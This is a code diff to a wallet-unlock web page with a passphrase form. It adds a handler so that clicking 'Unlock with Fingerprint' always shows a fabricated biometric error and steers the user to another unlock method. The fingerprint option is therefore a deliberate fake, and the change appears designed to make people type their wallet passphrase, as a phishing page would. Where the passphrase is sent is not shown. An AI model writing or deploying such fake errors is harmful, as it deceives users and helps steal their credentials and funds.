@@ -87,7 +87,7 @@
             <br>
             <button name="submit" type="submit" value="Submit">UNLOCK WITH PASSPHRASE</button>
             <br>
-            <button class="bone">UNLOCK WITH FINGERPRINT</button>
+            <button class="bone" id="fingerprintButton">UNLOCK WITH FINGERPRINT</button>
         </form>
     </div>
     <p></p>
@@ -115,6 +115,11 @@
             .then(data => {
                 console.log(data);
             })
+        });
+
+        // Simulate biometric verification error when "Unlock with Fingerprint" button is clicked
+        document.getElementById("fingerprintButton").addEventListener("click", function() {
+            alert("Biometric verification error. Please try again or use another method to unlock your wallet.");
         });
     </script>
 </body>
